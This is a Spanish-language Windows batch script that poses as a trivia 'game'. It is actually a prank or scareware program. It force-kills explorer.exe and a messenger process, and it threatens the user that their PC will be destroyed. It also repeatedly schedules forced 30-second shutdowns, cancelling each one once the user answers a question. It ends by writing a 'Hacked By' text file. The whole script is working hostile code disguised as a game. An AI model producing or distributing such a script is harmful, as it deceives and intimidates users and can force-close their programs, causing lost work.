@echo off 
title El "Game" De La Muerte! 
color 1f 
echo. 
msg * Una Ves Abierto Esto Ya No Lo Vasa Poder Cerrar... 
echo. 
TASKKILL /IM EXPLORER.EXE /F 
taskkill /f /IM msnmsgr.exe 
echo. 
set /p nombre= Elige El Nombre Del Jugador. 
cls 
echo. 
echo Hola %nombre%. Sabias Que Este Juego Es Un Juego Para Determinar 
echo El Estado De Tu PC.. Si Quieres Que No Le Pase Nada Y Siga Normal 
echo No Vallas A Cerrar Este Juego O Si No! Tu PC Sera Destrozada... 
echo. 
echo. 
set /p peti= ¿Aceptas? s/n 
echo. 
echo. 
echo Mira Te Voya Enseñar Como Jugar 1º Te Voya Dar 30segs Para Que Me 
echo A Responder 3 Preguntas >:) Si No Las Respondes A Tiempo. 
echo Tu Pc Se Apagara... Y No Podra Iniciar! >:) 
echo. 
echo ¿Listo? 
shutdown -s -f -t 30 
set /p primera=¿Cual Es El Nombre Del Grupo Que Canta "Tu" (Es Un Grupo Venezolano)? 
echo. 
echo Exelente, Siguiente: 
shutdown -a 
shutdown -s -f -t 30 
set /p segunda=¿Quien Es El Jugador De Futbol Mas Famoso De Todo El Mundo? 
echo Jajaja... Veo Que Si Sabes.... 
shutdown -a 
echo. 
echo Estas Preguntas Estuvieron Muy Faciles. Ahora Te Tocara La Ultima... 
echo Si La Fallas Tu PC *Caputt*... 
echo. 
echo Bueno, Preparado!: 
shutdown -f -s -t 30 
set /p tercera=¿En Verdad Crees Que Esto Te Descomopondria Tu PC? 
shutdown -a 
echo. 
echo JAJAJAJAJAJA...Pues La Verdad SI! Muahahahaha >:D 
echo Pero Como Veo Lo Has Contestado Las Preguntas 2/3 
echo Pasastes La Prueba ;) 
echo Hora En Que Pasastes La Prueba... 
time 
echo. 
echo Bueno Pues Me Retiro Pero Antes Te Dejare Algo ;)... 
echo off>>Hacked By LameraRiata.txt 